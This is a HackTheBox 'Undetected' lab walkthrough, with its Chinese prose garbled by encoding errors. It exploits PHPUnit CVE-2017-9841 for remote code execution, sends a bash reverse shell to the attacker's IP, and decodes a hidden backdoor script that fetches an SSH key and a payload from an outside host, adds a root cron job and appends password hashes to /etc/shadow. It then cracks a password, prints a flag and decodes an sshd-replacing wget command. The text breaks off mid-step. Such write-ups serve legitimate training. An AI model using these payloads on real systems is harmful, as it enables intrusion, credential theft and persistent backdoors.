Exploit\n```bash\nhttp://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n```\n> [https://www.cvedetails.com/cve/CVE-2017-9841/](https://www.cvedetails.com/cve/CVE-2017-9841/)\n\n> [https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md)\n\næ ¹æ®ä¸Šé¢å¯¹è¯¥æ¼æ´çš„æè¿°ï¼Œåœ¨vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.phpå¤„è¿›è¡Œåˆ©ç”¨ï¼Œå’±ä»¬æŠ“ä¸ªåŒ…è¿›è¡Œä¸€æ¬¡å°è¯•\n\n![](Hackthebox-Undetected/2e2b50fa-6df0-49cb-a9d7-6b9f86a361ef.png)\n\nåœ¨ä¸‹æ–¹åŠ å…¥ç„¶åæ”¾åŒ…æ‰§è¡Œ\n\n![](Hackthebox-Undetected/af5e7041-08e9-4148-9cf5-e83e4ec312e9.png)\n\næˆåŠŸè¢«æ‰§è¡Œäº†\n\nç°åœ¨å’±ä»¬æ¥æƒ³åŠæ³•æ„é€ ä¸€ä¸‹å‘½ä»¤\n\n```bash\nGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\nHost: store.djewelry.htb\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Length: 24\n\n<?php system(\"whoami\")?>\n```\n![](Hackthebox-Undetected/d24cb124-c76f-4f88-90d9-fff3f762f116.png)\n\næˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œç”¨curlçœ‹çœ‹èƒ½ä¸èƒ½æˆåŠŸå§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data \"<?php system('whoami')?>\"\nwww-data\n```\nOKï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆç°åœ¨æ¥æ„é€ pocå›å¼¹shellå§\n\n### Shell\nä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n```bash\n<?php system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.24/4444 0>&1\"')?>\n```\nåœ¨burpé‡Œæ‰§è¡Œå³å¯è·å¾—shell\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.24] from (UNKNOWN) [10.10.11.146] 56644\nbash: cannot set terminal process group (865): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\n<HP$ python3 -c \"import pty;pty.spawn('/bin/bash')\";                    \nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ whoami&&id\n<ore/vendor/phpunit/phpunit/src/Util/PHP$ whoami&&id                    \nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell\n\n```bash\nCtrl+Zè¿”å›\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\nä¿®å¤ä¸€ä¸‹shell\n\n## æƒé™æå‡\n### User\n```bash\nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ grep 'bash' /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nsteven:x:1000:1000:Steven Wright:/home/steven:/bin/bash\nsteven1:x:1000:1000:,,,:/home/steven:/bin/bash\n```\nå’±ä»¬çš„ææƒç›®æ ‡å°±åœ¨stevenå’Œsteven1è¿™ä¸¤ä¸ªç”¨æˆ·ä¸Šäº†\n\n```bash\nwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /home\nwww-data@production:/home$ ls\nsteven\nwww-data@production:/home$ cd steven\nbash: cd: steven: Permission denied\nwww-data@production:/home$ ls -la\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Feb  8 19:59 .\ndrwxr-xr-x 19 root   root   4096 Feb  8 19:59 ..\ndrwxr-x---  5 steven steven 4096 Feb  8 19:59 steven\n```\næ²¡æœ‰æƒé™è¿›å…¥stevenç”¨æˆ·ç›®å½•ï¼Œè¿™é‡Œæš‚æ—¶æ²¡æœ‰æ€è·¯äº†ï¼Œè·‘ä¸€ä¸ªLinpeasçœ‹çœ‹\n\nlinpeasè·‘å‡ºæ¥çš„ç»“æœæ¯”è¾ƒå¤šï¼Œå°±ä¸å…¨è´´å‡ºæ¥äº†ï¼Œå…¶ä¸­çœ‹åˆ°ä¸€ä¸ª\n\n/var/backups/infoå­˜åœ¨ä¸€ä¸ªè¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜æ˜¯www-dataæƒé™çš„ï¼Œå»çœ‹çœ‹\n\n```bash\nwww-data@production:/var/backups$ ls -la\ntotal 72\ndrwxr-xr-x  2 root     root      4096 Feb 24 23:49 .\ndrwxr-xr-x 13 root     root      4096 Feb  8 19:59 ..\n-rw-r--r--  1 root     root     34011 Feb  8 19:05 apt.extended_states.0\n-r-x------  1 www-data www-data 27296 May 14  2021 info\nwww-data@production:/var/backups$ file info \ninfo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped\n```\nè¿™æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\n776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b\n```\nåœ¨ä¸€å¤§å †ä¹±ç ä¸­æ‰¾åˆ°äº†è¿™ä¹ˆä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# echo \"776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b\" | xxd -r -p\nwget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" >> /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" && $3 >= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow\")}' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" && $3 >= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" > users.txt\")}' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" >> /etc/passwd; done < users.txt; rm users.txt;\n```\næˆ‘ä»¬å°†å®ƒè½¬ä¸ºASCIIæ ¼å¼\n\næå–å‡ºè¿™ä¹ˆä¸€ä¸²hashï¼Œç„¶åç¨å¾®ä¿®æ”¹ä¸€ä¸‹\n\n```bash\n$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/\n```\nç„¶åå†è¯»å–ä¸­çŸ¥é“äº†è¿™ä¸€ä¸²åº”è¯¥æ˜¯setven1çš„å¯†ç ï¼Œå»ä½¿ç”¨johnçˆ†ç ´ä¸€ä¸‹è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nihatehackers     (?)\n1g 0:00:00:55 DONE (2022-02-25 01:39) 0.01789g/s 1594p/s 1594c/s 1594C/s jojo95..halo03\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\nå¾—åˆ°äº†setven1çš„å¯†ç \n\n```bash\nusername = steven1\npassword = ihatehackers\n```\nä½¿ç”¨sshè¿›è¡Œè¿æ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh steven1@10.10.11.146\nsteven1@10.10.11.146's password: \nsteven@production:~$ whoami&&id\nsteven\nuid=1000(steven) gid=1000(steven) groups=1000(steven)\n```\næˆåŠŸè·å¾—useræƒé™\n\n```bash\nsteven@production:~$ ls\nuser.txt\nsteven@production:~$ cat user.txt \ne27e4aba73ab8ba7421550905082163e\n```\næˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶\n\n### Root\nsudo -læç¤ºå¤±è´¥ï¼Œé‚£å°±è·‘ä¸ªlinpeas.shçœ‹çœ‹æƒ…å†µå§\n\n```bash\n[+] Mails (limit 50)\n    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/mail/steven                                                                                                                            \n    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/spool/mail/steven\n```\nçœ‹åˆ°ä¸¤ä¸ªå…³äºé‚®ä»¶çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nsteven@production:~$ cat /var/mail/steven\nFrom root@production  Sun, 25 Jul 2021 10:31:12 GMT\nReturn-Path: <root@production>\nReceived: from production (localhost [127.0.0.1])\n        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847\n        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT\nReceived: (from root@localhost)\n        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;\n        Sun, 25 Jul 2021 10:31:12 GMT\nDate: Sun, 25 Jul 2021 10:31:12 GMT\nMessage-Id: <202107251031.80FAcdZ171847@production>\nTo: steven@production\nFrom: root@production\nSubject: Investigations\n\nHi Steven.\n\nWe recently updated the system but are still experiencing some strange behaviour with the Apache service.\nWe have temporarily moved the web store and database to another server whilst investigations are underway.\nIf for any reason you need access to the database or web application code, get in touch with Mark and he\nwill generate a temporary password for you to authenticate to the temporary server.\n\nThanks,\nsysadmin\n```\nè¿™é‡Œå¤§æ¦‚æ„æ€æ˜¯è¯´æœ€è¿‘æ›´æ–°äº†ä¸€ä¸‹ç³»ç»Ÿï¼Œä½†æ˜¯åœ¨apacheä¸Šæœ‰ç‚¹å¥‡æ€ªçš„é—®é¢˜ï¼Œæ‰€ä»¥æš‚æ—¶æŠŠå•†åŸå’Œæ•°æ®åº“æ¬è¿åˆ°å¦ä¸€å°æœåŠ¡å™¨ä¸Šäº†ï¼Œæ­£åœ¨æ’æŸ¥åŸå› ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦è®¿é—®çš„è¯å¯ä»¥è”ç³»Markï¼Œä»–ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªä¸´æ—¶å¯†ç çš„\n\nè¿™é‡Œæˆ‘çŒœæµ‹åº”è¯¥æ˜¯åšé‚®ä»¶ä¼ªé€ äº†\n\nä¸è¿‡æˆ‘ä»¬è¿˜æ˜¯å…ˆå»çœ‹çœ‹apacheæœåŠ¡å§\n\napacheæœåŠ¡ç›®å½•ä½äº/usr/lib\n\n```bash\nsteven@production:~$ ls -la /usr/lib/apache2/\ntotal 28\ndrwxr-xr-x  3 root root  4096 Jul  5  2021 .\ndrwxr-xr-x 82 root root  4096 Feb  8 19:59 ..\ndrwxr-xr-x  2 root root 20480 Jan 28 21:05 modules\n```\næˆ‘ä»¬å¯¹è¿™ä¸ªç›®å½•æœ‰è¯»å–å’Œæ‰§è¡Œæƒé™ï¼Œè¿˜ä¸é”™ï¼Œå»çœ‹çœ‹\n\n```bash\nsteven@production:/usr/lib/apache2/modules$ ls -la\ntotal 8796\ndrwxr-xr-x 2 root root   20480 Jan 28 21:05 .\ndrwxr-xr-x 3 root root    4096 Jul  5  2021 ..\n-rw-r--r-- 1 root root   15925 Jan  5 14:49 httpd.exp\n-rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_access_compat.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_actions.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_alias.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_allowmethods.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_asis.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_auth_basic.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_auth_digest.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_auth_form.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_anon.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_core.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbd.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_dbm.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authn_file.so\n-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_authn_socache.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_authnz_fcgi.so\n-rw-r--r-- 1 root root   55528 Jan  5 14:49 mod_authnz_ldap.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_authz_core.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbd.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_dbm.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_groupfile.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_host.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_owner.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_authz_user.so\n-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_autoindex.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_brotli.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_bucketeer.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_buffer.so\n-rw-r--r-- 1 root root   80176 Jan  5 14:49 mod_cache.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_cache_disk.so\n-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_cache_socache.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_case_filter_in.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_cern_meta.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_cgi.so\n-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_cgid.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_charset_lite.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_data.so\n-rw-r--r-- 1 root root  104656 Jan  5 14:49 mod_dav.so\n-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_dav_fs.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_dav_lock.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_dbd.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_deflate.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dialup.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dir.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_dumpio.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_echo.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_env.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_expires.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_ext_filter.so\n-rw-r--r-- 1 root root   14592 Jan  5 14:49 mod_file_cache.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_filter.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_headers.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_heartbeat.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_heartmonitor.so\n-rw-r--r-- 1 root root  253632 Jan  5 14:49 mod_http2.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ident.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_imagemap.so\n-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_include.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_info.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bybusyness.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_byrequests.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_lbmethod_bytraffic.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_lbmethod_heartbeat.so\n-rw-r--r-- 1 root root   84176 Jan  5 14:49 mod_ldap.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_debug.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_log_forensic.so\n-rw-r--r-- 1 root root  134544 Jan  5 14:49 mod_lua.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_macro.so\n-rw-r--r-- 1 root root  260672 Jan  5 14:49 mod_md.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_mime.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_mime_magic.so\n-rw-r--r-- 1 root root   67792 Jan  5 14:49 mod_mpm_event.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_mpm_prefork.so\n-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_mpm_worker.so\n-rw-r--r-- 1 root root   39120 Jan  5 14:49 mod_negotiation.so\n-rw-r--r-- 1 root root  133888 Jan  5 14:49 mod_proxy.so\n-rw-r--r-- 1 root root   55504 Jan  5 14:49 mod_proxy_ajp.so\n-rw-r--r-- 1 root root   59600 Jan  5 14:49 mod_proxy_balancer.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_proxy_connect.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_express.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_fcgi.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_proxy_fdpass.so\n-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_ftp.so\n-rw-r--r-- 1 root root   35024 Jan  5 14:49 mod_proxy_hcheck.so\n-rw-r--r-- 1 root root   39152 Jan  5 14:49 mod_proxy_html.so\n-rw-r--r-- 1 root root   47312 Jan  5 14:49 mod_proxy_http.so\n-rw-r--r-- 1 root root   67936 Jan  5 14:49 mod_proxy_http2.so\n-rw-r--r-- 1 root root   22768 Jan  5 14:49 mod_proxy_scgi.so\n-rw-r--r-- 1 root root   22656 Jan  5 14:49 mod_proxy_uwsgi.so\n-rw-r--r-- 1 root root   18560 Jan  5 14:49 mod_proxy_wstunnel.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ratelimit.so\n-rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_reflector.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_remoteip.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_reqtimeout.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_request.so\n-rw-r--r-- 1 root root   75984 Jan  5 14:49 mod_rewrite.so\n-rw-r--r-- 1 root root   43216 Jan  5 14:49 mod_sed.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_session.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_session_cookie.so\n-rw-r--r-- 1 root root   30928 Jan  5 14:49 mod_session_crypto.so\n-rw-r--r-- 1 root root   22736 Jan  5 14:49 mod_session_dbd.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_setenvif.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_slotmem_plain.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_slotmem_shm.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_dbm.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_memcache.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_socache_redis.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_socache_shmcb.so\n-rw-r--r-- 1 root root   18640 Jan  5 14:49 mod_speling.so\n-rw-r--r-- 1 root root  248240 Jan  5 14:49 mod_ssl.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_status.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_substitute.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_suexec.so\n-rw-r--r-- 1 root root   14464 Jan  5 14:49 mod_unique_id.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_userdir.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_usertrack.so\n-rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_vhost_alias.so\n-rw-r--r-- 1 root root   26832 Jan  5 14:49 mod_xml2enc.so\n```\næ–‡ä»¶æœ‰ç‚¹å¤šå•Šï¼Œé‚£ä¹ˆç¨å¾®ç­›é€‰ä¸€ä¸‹ï¼ŒæŒ‰ç…§æœ€è¿‘ä¿®æ”¹æ¥æ’åº\n\n```bash\nsteven@production:/usr/lib/apache2/modules$ ls --full-time -i | sort -u\n 2050 -rw-r--r-- 1 root root   34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so\n```\nå°±æ˜¯è¿™ä¸ªæ–‡ä»¶äº†ï¼Œæˆ‘ä»¬æŠŠå®ƒä¸‹è½½ä¸‹æ¥çœ‹çœ‹\n\n```bash\nscp steven1@10.10.11.146:/usr/lib/apache2/modules/mod_reader.so ~/Desktop\n```\nä¸‹è½½ä¸‹æ¥åï¼Œåœ¨mod\\_reader.soä¸­æå–åˆ°ä¸€æ®µbase64ç \n\n```bash\nd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk\n```\nç»™è§£æä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# echo -n 'd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk' | base64 -d\nwget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd\n```\nè¿™è¾¹æ˜¯æŠŠè¿™å¼ å›¾ç‰‡ä¼ è¾“åˆ°sshdï¼Œå»ä¸‹è½½ä¸‹æ¥\n\nä½¿ç”¨ghidraæ‰“å¼€è¿›è¡Œé€†å‘\n\n![](Hackthebox-Undetected/e151a5a6-d502-473f-9bbc-85c89c7b4278.png)\n\nä»è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œæˆ‘ä»¬çš„å¯†ç æ˜¯31ä½\n\n```bash\nbackdoor._28_2_ = 0xa9f4;\nbackdoor._24_4_ = 0xbcf0b5e3;\nbackdoor._16_8_ = 0xb2d6f4a0fda0b3d6;\nbackdoor[30] = -0x5b;\nbackdoor._0_4_ = 0xf0e7abd6;\nbackdoor._4_4_ = 0xa4b3a3f3;\nbackdoor._8_4_ = 0xf7bbfdc8;\nbackdoor._12_4_ = 0xfdb3d6e7;\n```\næˆ‘ä»¬ç»™å®ƒæ’åºä¸€ä¸‹ï¼Œä»é«˜åˆ°ä½æ’åº\n\n```bash\nbackdoor[30] = -0x5b;\nbackdoor._28_2_ = 0xa9f4;\nbackdoor._24_4_ = 0xbcf0b5e3;\nbackdoor._16_8_ = 0xb2d6f4a0fda0b3d6;\nbackdoor._12_4_ = 0xfdb3d6e7;\nbackdoor._8_4_ = 0xf7bbfdc8;\nbackdoor._4_4_ = 0xa4b3a3f3;\nbackdoor._0_4_ = 0xf0e7abd6;\n```\n```bash\n0x5b\n0xa9f4\n0xbcf0b5e3\n0xb2d6f4a0fda0b3d6\n0xfdb3d6e7\n0xf7bbfdc8\n0xa4b3a3f3\n0xf0e7abd6\n```\nè¿™è¾¹æ’åºå¥½ä»¥åï¼Œå³é”®æŸ¥çœ‹ä¸€ä¸‹0x5b\n\n![](Hackthebox-Undetected/fa67391c-212f-4e76-9b01-1a5d250c88f7.png)\n\nå‘ç°æ­£ç¡®çš„åº”è¯¥æ˜¯0xa5ï¼Œä¿®æ”¹ä¸€ä¸‹åå»åšä¸€ä¸‹ç¼–ç \n\né¦–å…ˆè½¬åŒ–æˆHEXå†è½¬åŒ–ä¸ºXOR\n\n> 